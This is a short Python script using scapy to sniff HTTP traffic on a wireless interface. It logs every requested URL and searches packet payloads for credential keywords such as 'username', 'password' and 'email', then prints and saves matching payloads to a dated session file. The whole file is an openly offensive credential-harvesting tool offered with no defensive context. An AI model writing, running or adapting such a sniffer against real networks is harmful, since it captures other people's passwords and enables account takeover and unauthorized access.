import scapy.all as scapy
from scapy.layers import http
import datetime

curr_date = datetime.datetime.now()

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url

def get_passsword(packet):
    load = packet[scapy.Raw].load
    keywords = ["UserName", "Password", "username", "password", "user", "pass", "email"]
    for k in keywords:
        if k in load:
            print("\n\n[+] Possible username/password >> " + load + "\n\n")
            output = "\n\n[+] Possible username/password >> " + load + "\n\n"
            f = open(str(curr_date) + "_session.txt", "a")
            f.write(output)
            break

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] Possible URL >> http://" + get_url(packet))
        output = "\n[+] Possible URL >> http://" + get_url(packet)
        f = open(str(curr_date) + "_session.txt", "a")
        f.write(output)
        if packet.haslayer(scapy.Raw):
            get_passsword(packet)



sniff("wlan0")